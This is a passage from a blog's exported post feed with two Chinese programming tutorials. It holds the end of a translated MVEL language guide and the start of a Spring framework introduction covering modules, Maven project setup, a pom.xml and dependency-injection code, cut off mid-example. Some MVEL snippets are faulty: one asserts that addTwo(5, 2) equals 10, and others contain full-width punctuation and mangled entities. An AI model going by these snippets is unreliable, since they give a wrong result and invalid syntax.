href="#6-While-Until" class="headerlink" title="6. While, Until"></a>6. While, Until</h3><p>MVEL中实现了标准的While，并添加了一个与之相反的Until。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">isTrue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者写成</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">until <span class="token punctuation">(</span><span class="token function">isFalse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="八、投影和交集"><a href="#八、投影和交集" class="headerlink" title="八、投影和交集"></a>八、投影和交集</h2><p>简单地说，投影是一种描述集合的方式。 通过非常简单的语法，您可以检索集合中非常复杂的对象模型。</p><p>假设，你有一个User对象的集合。 每个对象都有一个Parent。 现在你想获得集合users中的所有parent的name的列表（假设Parent中有字段name），你可以这样来写：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">parentNames <span class="token operator">=</span> <span class="token punctuation">(</span>parent<span class="token punctuation">.</span>name in users<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>您甚至可以执行嵌套操作，假设，User对象有个集合成员叫做familyMembers，现在我们想获得一个所有家庭成员姓名的集合：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">familyMembers <span class="token operator">=</span> <span class="token punctuation">(</span>name in <span class="token punctuation">(</span>familyMembers in users<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="九、赋值"><a href="#九、赋值" class="headerlink" title="九、赋值"></a>九、赋值</h2><p>MMVEL允许你对表达式中的变量进行赋值，以便在运行时获取，或在表达式内部使用。因为MVEL是动态类型语言，所以你不必为了声明一个变量而指定其类型。当然，你也可以选择指定。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">str <span class="token operator">=</span>“<span class="token class-name">My</span> <span class="token class-name">String</span>”<span class="token punctuation">;</span> <span class="token comment">// valid</span><span class="token class-name">String</span> str <span class="token operator">=</span>“<span class="token class-name">My</span> <span class="token class-name">String</span>”<span class="token punctuation">;</span> <span class="token comment">// valid</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>与java语言不同的是，当给一个指定类型的变量赋值时，MVEL会提供自动的类型转换（可行的话），如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> num <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">assert</span> num <span class="token keyword">instanceof</span> <span class="token class-name">String</span>＆amp<span class="token punctuation">;</span>＆amp<span class="token punctuation">;</span> num <span class="token operator">==</span>“<span class="token number">1</span>”<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>对于动态类型变量而言，你要想对其进行类型转换，你只需要将值转换成相应的类型既可：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">num <span class="token operator">=</span>（<span class="token class-name">String</span>）<span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">assert</span> num <span class="token keyword">instanceof</span> <span class="token class-name">String</span>＆amp<span class="token punctuation">;</span>＆amp<span class="token punctuation">;</span> num <span class="token operator">==</span>“<span class="token number">1</span>”<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="十、函数定义"><a href="#十、函数定义" class="headerlink" title="十、函数定义"></a>十、函数定义</h2><p>MVEL可以使用def或function关键字来定义本地函数。</p><p>函数必须是先声明后引用，唯一例外的是递归调用的时候。</p><h3 id="1-一个简单示例"><a href="#1-一个简单示例" class="headerlink" title="1. 一个简单示例"></a>1. 一个简单示例</h3><p>定义一个简单函数：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">def <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>定义了一个没有参数的函数<code>hello</code>.当调用该函数时会在控制台打印”Hello!” 一个MVEL定义的函数就像任何常规的方法调用。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-传参和返回值"><a href="#2-传参和返回值" class="headerlink" title="2. 传参和返回值"></a>2. 传参和返回值</h3><p>函数可以接收参数和返回一个值，看下面的示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">def <span class="token function">addTwo</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这个函数会接收两个参数(a和b)，然后将这两个变量相加。因为MVEL遵循last-value-out原则，所以结果将会被返回。因此，你可以这样来使用这个函数：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">val <span class="token operator">=</span> <span class="token function">addTwo</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">assert</span> val <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当然，也可以使用return关键字来强制从程序内部返回一个函数值。</p><h3 id="3-闭包"><a href="#3-闭包" class="headerlink" title="3. 闭包"></a>3. 闭包</h3><p>MVEL支持闭包,然而其功能与本地java函数没有任何关联。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 定义一个接收一个参数的函数</span>def <span class="token function">someFunction</span><span class="token punctuation">(</span>f_ptr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">f_ptr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token comment">// 定义变量a</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token comment">// 传递函数闭包</span><span class="token function">someFunction</span><span class="token punctuation">(</span>def <span class="token punctuation">&#123;</span> a <span class="token operator">*</span> <span class="token number">10</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="十一、Lambda表达式"><a href="#十一、Lambda表达式" class="headerlink" title="十一、Lambda表达式"></a>十一、Lambda表达式</h2><p>MVEL允许定义Lambda方法，如下所示：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">threshold <span class="token operator">=</span> def <span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> x <span class="token operator">>=</span> <span class="token number">10</span> <span class="token operator">?</span> x <span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>result <span class="token operator">=</span> cost <span class="token operator">+</span> <span class="token function">threshold</span><span class="token punctuation">(</span>lowerBound<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上面的例子定义了一个Lambda，并将其赋值给变量”threshold”.Lambda实质上就是一个用来给变量赋值的函数，也是闭包。</p><p>翻译原文：<a href="http://mvel.documentnode.com/">http://mvel.documentnode.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> MVEL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring基础介绍</title>
      <link href="/2018/09/17/hou-duan/spring-ji-chu-jie-shao/"/>
      <url>/2018/09/17/hou-duan/spring-ji-chu-jie-shao/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Spring-概述"><a href="#一、Spring-概述" class="headerlink" title="一、Spring 概述"></a>一、Spring 概述</h2><h3 id="（一）Spring-的简史"><a href="#（一）Spring-的简史" class="headerlink" title="（一）Spring 的简史"></a>（一）Spring 的简史</h3><p><a href="https://spring.io/">Spring</a> 的历史网上有很多的介绍，下面是 Spring 发展历程的一个简介。</p><h4 id="1-第一阶段：xml-配置"><a href="#1-第一阶段：xml-配置" class="headerlink" title="1. 第一阶段：xml 配置"></a>1. 第一阶段：xml 配置</h4><p>在 Spring 1.x 时代，使用 Spring 开发满眼都是 xml 配置的 Bean，随着项目的扩大，我们需要把 xml 配置文件放到不同的配置文件里，那时候需要频繁地在开发的类和配置文件之间切换。</p><h4 id="2-第二阶段：注解配置"><a href="#2-第二阶段：注解配置" class="headerlink" title="2. 第二阶段：注解配置"></a>2. 第二阶段：注解配置</h4><p>在 Spring 2.x 时代，随着 JDK 1.5 带来的注解支持，Spring 提供了声明 Bean 的注解（如：@Component、@Service），大大减少了配置量。这时 Spring 圈子里存在着一种争论：注解配置和 xml 配置究竟哪个更好？我们最终的选择是应用的基本配置（如：数据库配置）用 xml，业务配置用注解。</p><h4 id="3-第三阶段：Java-配置"><a href="#3-第三阶段：Java-配置" class="headerlink" title="3. 第三阶段：Java 配置"></a>3. 第三阶段：Java 配置</h4><p>从 Spring 3.x 到现在，Spring 提供了 Java 配置的能力，使用 Java 配置可以让你更理解你配置的 Bean。我们目前刚好处于这个时代，Spring 4.x 和 Spring Boot 都推荐使用 Java 配置。</p><h3 id="（二）Spring-概述"><a href="#（二）Spring-概述" class="headerlink" title="（二）Spring 概述"></a>（二）Spring 概述</h3><p>Spring 框架是一个轻量级的企业级开发的一站式解决方案。所谓解决方案就是可以基于 Spring 解决 JavaEE 开发的所有问题。Spring 框架主要提供了<code>IoC</code>容器、AOP、数据访问、Web 开发、消息、测试等相关技术的支持。</p><p>Spring 使用简单的 POJO（<code>Plain Old Java Object</code>，即无任何限制的普通Java对象）来进行企业级开发。每一个被 Spring 管理的 Java 对象都被称之为 Bean；而 Spring 提供了一个 IoC 容器用来初始化对象，解决对象间的依赖管理和对象的使用。</p><h4 id="1-Spring-的模块"><a href="#1-Spring-的模块" class="headerlink" title="1. Spring 的模块"></a>1. Spring 的模块</h4><p>Spring 是模块化的，这意味着你可以只使用你需要的Spring的模块。如下图所示：</p><p><img src="https://statics.sh1a.qingstor.com/2019/03/02/spring-moudle.png" alt="Spring 模块"></p><p>图中的每个最小单元，Spring 都至少有一个对应的 jar 包。</p><h5 id="（1）核心容器（Core-Contariner）"><a href="#（1）核心容器（Core-Contariner）" class="headerlink" title="（1）核心容器（Core Contariner）"></a>（1）核心容器（Core Contariner）</h5><ul><li>Spring-Core：核心工具类，Spring 其他模块大量使用 Spring-Core</li><li>Spring-Beans：Spring 定义 Bean 的支持</li><li>Spring-Context：运行时 Spring 容器</li><li>Spring-Context-Support：容器对第三方包的集成支持</li><li>Spring-Expression：使用表达式语言在运行时查询和操作对象</li></ul><h5 id="（2）AOP"><a href="#（2）AOP" class="headerlink" title="（2）AOP"></a>（2）AOP</h5><ul><li>Spring-AOP：基于代理的 AOP 支持</li><li>Spring-Aspects：基于 AspectJ 的 AOP 支持</li></ul><h5 id="（3）消息（Messaging）"><a href="#（3）消息（Messaging）" class="headerlink" title="（3）消息（Messaging）"></a>（3）消息（Messaging）</h5><ul><li>Spring-Messaging：对消息架构和协议的支持</li></ul><h5 id="（4）Web"><a href="#（4）Web" class="headerlink" title="（4）Web"></a>（4）Web</h5><ul><li>Spring-Web：提供基础的 Web 集成的功能，在 Web 项目中提供 Spring 的容器</li><li>Spring-Webmvc：提供基于 Servlet 的 Spring MVC</li><li>Spring-WebSocket：提供 WebSocket 功能</li><li>Spring-Webmvc-Portlet：提供 Portlet 环境功能</li></ul><h5 id="（5）数据访问-集成（Data-Access-Integration）"><a href="#（5）数据访问-集成（Data-Access-Integration）" class="headerlink" title="（5）数据访问/集成（Data Access/Integration）"></a>（5）数据访问/集成（Data Access/Integration）</h5><ul><li>Spring-JDBC：提供以 JDBC 访问数据库的支持</li><li>Spring-TX：提供编程式和声明式的事务支持</li><li>Spring-ORM：提供对对象/关系映射技术的支持</li><li>Spring-OXM：提供对对象/xml 映射技术的支持</li><li>Spring-JMS：提供对 JMS 的支持</li></ul><h4 id="1-Spring-的生态"><a href="#1-Spring-的生态" class="headerlink" title="1. Spring 的生态"></a>1. Spring 的生态</h4><p>Spring 发展到现在已经不仅仅是 Spring 框架本身的内容，Spring 目前提供了大量的基于 Spring 的项目，可以用来更深入地降低我们的开发难度，提高开发效率。<br>目前 Spring 的生态里主要有以下项目，我们可以根据自己项目的需要来选择使用相应的项目。</p><ul><li>Spring Boot：使用默认开发配置来实现快速开发</li><li>Spring XD：用来简化大数据应用开发</li><li>Spring Cloud：为分布式系统开发提供工具集</li><li>Spring Data：对主流关系型和 NoSQL 数据库的支持</li><li>Spring Integration：通过消息机制对企业集成模式（EIP）的支持</li><li>Spring Batch：简化及优化大量数据的批处理操作</li><li>Spring Security：通过认证和授权保护应用</li><li>Spring HATEOAS：基于 HATEOAS 原则简化 REST 服务开发</li><li>Spring Social：与社交网络 API（如：Facebook、新浪微博等）的集成</li><li>Spring AMQP：对基于 AMQP 的消息的支持</li><li>Spring Mobile：提供对手机设备检测的功能，给不同的设备返回不同的页面的功能</li><li>Spring for Android：主要提供在 Android 上消费 RESTful API 的功能</li><li>Spring Web Flow：基于 SpringMVC 提供基于向导流程式的 Web 应用开发</li><li>Spring Web Services：提供了基于协议有限的 SOAP/Web 服务</li><li>Spring LDAP：简化使用 LDAP 开发</li><li>Spring Session：提供一个 API 及实现来管理用户会话信息</li></ul><h2 id="二、Spring-项目快速搭建"><a href="#二、Spring-项目快速搭建" class="headerlink" title="二、Spring 项目快速搭建"></a>二、Spring 项目快速搭建</h2><p>这里我们使用目前 Java 主流的项目构建工具<a href="http://maven.apache.org/">Maven</a>来搭建项目。</p><h3 id="（一）Maven-介绍"><a href="#（一）Maven-介绍" class="headerlink" title="（一）Maven 介绍"></a>（一）Maven 介绍</h3><p>Apache Maven 是一个基于项目对象模型（Project Object Model，POM）的软件项目管理工具。Maven 可用来管理项目的依赖、编译、打包、文档等信息。使用 Maven 来管理项目时，项目依赖的 jar 包将不再包含在项目内，而是集中放置在用户目录下的 .m2 文件夹下。关于 Maven 的详细安装介绍可参考[这里][4]。</p><h3 id="（二）创建项目"><a href="#（二）创建项目" class="headerlink" title="（二）创建项目"></a>（二）创建项目</h3><p>在创建项目之前，须确保你的计算机上已经安装好有 Java 和 Maven 环境。然后，打开终端通过以下简单的命令就可以在你的当前目录下创建一个 Jave web 的项目结构：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mvn archetype:generate <span class="token parameter variable">-DgroupId</span><span class="token operator">=</span>com.blinkfox <span class="token parameter variable">-DartifactId</span><span class="token operator">=</span>springdemo <span class="token parameter variable">-DpackageName</span><span class="token operator">=</span>com.blinkfox.springdemo <span class="token parameter variable">-DarchetypeArtifactId</span><span class="token operator">=</span>maven-archetype-webapp <span class="token parameter variable">-DinteractiveMode</span><span class="token operator">=</span>false<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中<code>-DgroupId=com.blinkfox</code>是组织名，<code>-DartifactId=springdemo</code>是该组织下的项目名称，<code>-DarchetypeArtifactId=maven-archetype-webapp</code>代表创建一个简单的 webapp 项目。</p><p>创建项目的时候，Maven会自动下载一些需要用到的 jar 包和 Maven 插件。如果顺利创建成功的话，就会在你的当前目录下看到名为 springdemo 的项目，其中包含<code>src</code>的文件夹和<code>pom.xml</code>文件。且在你的终端会看到如下输出：</p><p><img src="https://statics.sh1a.qingstor.com/2019/03/02/maven-build-project.png" alt="Maven创建项目成功"></p><h3 id="（三）添加-Spring-依赖"><a href="#（三）添加-Spring-依赖" class="headerlink" title="（三）添加 Spring 依赖"></a>（三）添加 Spring 依赖</h3><p>接下来需要通过修改 pom.xml 来添加 Spring 的依赖，添加编译插件，且将编译级别设置为1.7，pom.xml文件的修改如下：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">></span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.blinkfox<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>springdemo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>packaging</span><span class="token punctuation">></span></span>war<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>packaging</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.0-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>springdemo Maven Webapp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>http://maven.apache.org<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java.version</span><span class="token punctuation">></span></span>1.7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java.version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-context<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.3.3.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>finalName</span><span class="token punctuation">></span></span>springdemo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>finalName</span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- 指定maven的默认操作为 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>defaultGoal</span><span class="token punctuation">></span></span>compile<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>defaultGoal</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-compiler-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span><span class="token punctuation">></span></span>$&#123;java.version&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>source</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">></span></span>$&#123;java.version&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>target</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoding</span><span class="token punctuation">></span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoding</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、Spring-基础配置"><a href="#三、Spring-基础配置" class="headerlink" title="三、Spring 基础配置"></a>三、Spring 基础配置</h2><p>Spring 框架本身有四大原则：</p><ul><li>使用 POJO 进行轻量级和最小侵入式开发</li><li>通过依赖注入和面向接口编程来实现松耦合</li><li>通过 AOP 和默认习惯进行声明式编程</li><li>使用 AOP 和模板(template)减少模式化代码</li></ul><p>Spring 的所有功能设计和实现都是基于此四大原则。</p><h3 id="（一）依赖注入"><a href="#（一）依赖注入" class="headerlink" title="（一）依赖注入"></a>（一）依赖注入</h3><h4 id="1-重点说明"><a href="#1-重点说明" class="headerlink" title="1. 重点说明"></a>1. 重点说明</h4><p>我们经常说的控制反转（Inversion of Control，IoC）和依赖注入（dependency injection，DI）在 Spring 环境下是等同的概念，控制反转是通过依赖注入实现的。所谓依赖注入指的是容器负责创建对象和维护对象间的依赖关系，而不是通过对象本身负责自己的创建和解决自己的依赖。</p><p>依赖注入的主要目的是为了解耦，体现了一种“组合”的理念。如果你希望你的类具备某项功能的时候，是继承自一个具有此功能的父类好呢？还是组合另外一个具有这个功能的类好呢？答案是不言而喻的，继承一个父类，之类将与父类耦合，组合另外一个类则使耦合度大大降低。</p><p>Spring IoC 容器（ApplicationContext）负责创建 Bean，并通过容器将功能类 Bean 注入到你需要的 Bean 中。Spring 提供使用 xml、注解、Java 配置、groovy 配置实现 Bean 的创建和注入。</p><p>无论是 xml 配置、注解配置还是 Java 配置，都被称为配置元数据，所谓元数据即描述数据的数据。元数据本身不具备任何可执行的能力，只能通过外界代码来对这些元数据行解析后进行一些有意义操作。Spring 容器解析这些配置元数据进行 Bean 初始化、配置和管理依赖。</p><p>声明 Bean 的注解：</p><ul><li><code>@Component</code>: 组件，没有明确角色</li><li><code>@Controller</code>: 在展现层（MVC -&gt; Spring MVC）使用</li><li><code>@Service</code>: 在业务逻辑层（service层）使用</li><li><code>@Repository</code>: 在数据访问层（dao层）使用</li></ul><p>注入 Bean 的注解，一般情况下通用：</p><ul><li><code>@Autowired</code>: Spring 提供的注解</li><li><code>@Inject</code>: JSR-330 提供的注解</li><li><code>@Resource</code>: JSR-250 提供的注解</li></ul><p><code>@Autowired</code>、<code>@Inject</code>、<code>@Resource</code>可注解在 set 方法上或者属性上，推荐注解在属性上，优点是代码更少、层次更清晰。</p><h4 id="2-代码示例"><a href="#2-代码示例" class="headerlink" title="2. 代码示例"></a>2. 代码示例</h4><p>（1）编写功能类的 Bean。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Service</span></span><span class="token punctuation">;</span><span class="token comment">/** * Created by blinkfox on 2016/10/27. */</span><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FunctionService</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token class-name">String</span> word<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"Hello "</span> <span class="token operator">+</span> word <span class="token operator">+</span> <span class="token string">"!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>代码解释</strong>：</p><ol><li>使用 @Service 注解声明当前 FunctionService 类是 Spring 管理的一个 Bean。其中，使用 @Component、@Service、@Repository、@Controller 是等效的，可根据需要选用。</li></ol></blockquote><p>（2）使用功能类的 Bean。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token 